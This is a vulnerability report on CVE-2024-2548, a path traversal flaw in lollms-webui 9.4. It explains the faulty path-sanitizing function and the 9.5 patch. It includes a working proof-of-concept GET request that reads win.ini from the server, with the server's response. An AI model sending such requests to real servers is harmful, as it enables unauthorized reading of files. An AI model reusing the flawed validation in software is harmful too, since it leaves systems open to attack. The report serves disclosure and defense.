"# CVE-2024-2548 Detailed Report\n\n## Summary\nCVE-2024-2548 is a path traversal vulnerability identified in the `parisneo/lollms-webui` application, specifically affecting version 9.4. The vulnerability is classified under CWE-36 (Absolute Path Traversal). It allows attackers to read arbitrary files on the Windows operating system due to inadequate validation of file paths when using the `Path(path).is_absolute()` method. The flaw is triggered when a specially crafted request is sent to the `/user_infos/{path:path}` endpoint, enabling the reading of sensitive files, such as the `win.ini` file. This vulnerability has been addressed in version 9.5 of the software.\n\n## Root Cause of the Vulnerability\nThe root cause of the vulnerability lies in the improper validation of file paths in the `lollms_binding_files_server.py` and `security.py` files. The `sanitize_path_from_endpoint` function is intended to validate the path provided by the user. However, it fails to adequately handle certain path formats, particularly those that are absolute or contain multiple slashes.\n\n### Code Analysis\nIn the original implementation, the following code snippet is responsible for path validation:\n\n```python\ndef sanitize_path_from_endpoint(path: str, error_text=\"A suspected LFI attack detected. The path sent to the server has suspicious elements in it!\", exception_text=\"Invalid path!\"):\n    if path is None:\n        return path\n    \n    # Regular expression to detect patterns like \"....\" and multiple forward slashes\n    suspicious_patterns = re.compile(r'(\\.\\.+)|(/+/)')\n    \n    if suspicious_patterns.search(path) or Path(path).is_absolute():\n        ASCIIColors.error(error_text)\n        raise HTTPException(status_code=400, detail=exception_text)\n    \n    return path\n```\n\nThe vulnerability arises because the check for absolute paths using `Path(path).is_absolute()` does not sufficiently prevent attackers from exploiting the application by crafting paths that bypass this check. For instance, an attacker could send a request like `GET /user_infos//Windows/win.ini`, which would not be caught by the existing validation logic.\n\nThe patch introduced in version 9.5 modifies the `sanitize_path_from_endpoint` function to include an additional check that strips leading slashes from the path:\n\n```python\npath = path.lstrip('/')\n```\n\nThis change helps mitigate the risk of path traversal by ensuring that paths starting with slashes are treated correctly, thus preventing access to unintended files.\n\n## Exploitation Details\nTo exploit this vulnerability, an attacker would need to send a specially crafted HTTP GET request to the vulnerable endpoint. The request would look like this:\n\n```\nGET /user_infos//Windows/win.ini HTTP/1.1\nHost: 127.0.0.1:9600\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36\n```\n\nIf successful, the server would respond with the contents of the `win.ini` file, demonstrating the ability to read arbitrary files on the system.\n\n## Environment Setup Requirements\n- **Port**: 9600\n- **Target Endpoint**: `/user_infos/{path:path}`\n- **Explicit Configuration**: None explicitly mentioned in the advisory.\n\n## Complete PoC Code\nThe proof-of-concept code provided in the advisory is as follows:\n\n```\nREQUEST:\nGET /user_infos//Windows/win.ini HTTP/1.1\nHost: 127.0.0.1:9600\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36\nRESPONSE:\nHTTP/1.1 200 OK\ndate: Wed, 13 Mar 2024 14:22:38 GMT\nserver: uvicorn\ncontent-type: text/plain; charset=utf-8\ncontent-length: 92\nlast-modified: Sat, 07 Dec 2019 09:12:42 GMT\netag: \"04d8b65948d9cd4859877d2172b4db8d\"\n\n; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]\n[Mail]\nMAPI=1\n```\n\nThis PoC demonstrates how an attacker can exploit the vulnerability to read sensitive files from the server."